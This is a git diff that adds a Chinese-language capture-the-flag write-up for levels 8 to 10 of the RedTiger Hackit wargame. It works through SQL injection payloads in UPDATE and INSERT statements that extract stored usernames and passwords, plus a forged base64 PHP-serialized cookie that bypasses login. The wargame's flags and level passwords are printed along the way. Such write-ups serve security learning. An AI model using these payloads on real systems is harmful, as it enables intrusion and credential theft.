@@ -546,11 +546,125 @@ print "result is ", result
 
 ## level 8
 
+点击 `edit` ，可以更改用户的信息。
+
+测试注入点，在 `email` 处输入 `'` 得到报错信息。
+
+> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the > right syntax to use near '12345', age = '25' WHERE id = 1' at line 3
+
+在 `email` 的内容前面输入 `'`，得到更精确的信息。
+
+> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the > right syntax to use near 'hans@localhost'', icq = '12345', age = '25' WHERE id = 1' at line 3 
+
+可以确定这是一条更新语句。
+猜测sql语句为：
+```
+update user set email='$email',icq='$icq',age='$age' where id=1 
+```
+可以利用 `update` 将 `password`更新到 `name` 字段，注意 `'`的闭合。
 
 
+update user set email='hans@localhost`',name=password,icq='`',icq='12345',age='25' where id=1 
+
+
+
+> You can raise your wechall.net score with this flag: 9ea04c5d4f90dae92c396cf7a6787715
+> The password for the next level is: cybercyber_vuln
+
+## level 9
+
+这题输入`autor=123`、 `title=123`、 `text=123` 会在数据库中插入此条信息。
+
+分别测试三个字段，发现注入点在 `text` 字段。报错信息为：
+
+> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the > right syntax to use near ''123'')' at line 6
+
+这里SQL语句还原应该是 `'$text')` ，这里应当是 `insert` 语句。
+
+```
+insert into tablename(autor, title, text) values('$autor', '$title', '$text');
+```
+测试，
+
+```
+autor=123&title=123&text=123'),('4','5','6&post=Submit+Query
+```
+成功。
+
+根据题目要求，`Get username and password of any user. Tablename: level9_users` 。
+
+```
+autor=123&title=123&text=123'),((select username from level9_users limit 0,1),(select password from level9_users limit 0,1),'6&post=Submit+Query
+```
+
+> Autor: TheBlueFlower
+> Title: this_oassword_is_SEC//Ure.promised!
+> 6 
+
+
+
+> You can raise your wechall.net score with this flag: 84ec870f1ac294508400e30d8a26a679
+> The password for the next level is: get_post_cookie_head__kittens_eating_all_my_bread
+
+## level 10
+
+
+点击 `Login` 得到登陆用户为 `Monkey`。
+```
+login=YToyOntzOjg6InVzZXJuYW1lIjtzOjY6Ik1vbmtleSI7czo4OiJwYXNzd29yZCI7czoxMjoiMDgxNXBhc3N3b3JkIjt9
+```
+
+注入`'` 到 `login`参数，得到正常结果，但是将 `login` 原参数删除一些字符后，得到报错结果。
+
+> Notice: unserialize(): Error at offset 68 of 68 bytes in /var/www/html/hackit/level10.php on line 34
+
+`login`的值为字母和数字的组合，应该是 `Base64` 加密后的结果，用 `base64` 解密，可得：
+
+
+	a:2:{s:8:"username";s:6:"Monkey";s:8:"password";s:12:"0815password";}
+
+在用PHP 的  `unserialize` 反序列化得到：
+
+	array (
+	  'username' => 'Monkey',
+	  'password' => '0815password',
+	)
+
+由于是 `array` 数据， 可以将 `password` 设置为 `true`， 绕过密码判断。
+
+```
+array (
+  'username' => 'TheMaster',
+  'password' => true,
+)
+```
+
+经过 序列化 后得到
+```
+a:2:{s:8:"username";s:9:"TheMaster";s:8:"password";b:1;}
+```
+
+在经过 `Base64` 加密。
+
+```
+login=YToyOntzOjg6InVzZXJuYW1lIjtzOjk6IlRoZU1hc3RlciI7czo4OiJwYXNzd29yZCI7YjoxO30=&dologin=Login
+```
+
+通关！
+
+> Welcome TheMaster.
+> You solved the hackit :)
+> You can raise your wechall.net score with this flag: 721ce43d433ad85bcfa56644b112fa52
+> The password for the hall of fame is: exec_is_safer_than_unserialize
+
+终于将10关搞定。
+
+> Congratulation. You solved all 10 levels of the hackit.
+> If you want to put your name into the hall of fame you can use the form below.
 
 ## 参考网站
 [1] [SQL 注入](https://ctf-wiki.github.io/ctf-wiki/web/sqli/)
 [2] [SQL注入教程——（三）简单的注入尝试](http://blog.csdn.net/helloc0de/article/details/76142478)
 [3] [Redtiger Hackit Writeup](https://blog.spoock.com/2016/07/25/redtiger-writeup/)
 [4] [RedTiger libs writeup](http://ph0rse.me/2017/07/29/RedTiger-libs-writeup/)
+[5] [RedTiger's Hackit](http://lucifaer.com/index.php/archives/19/)
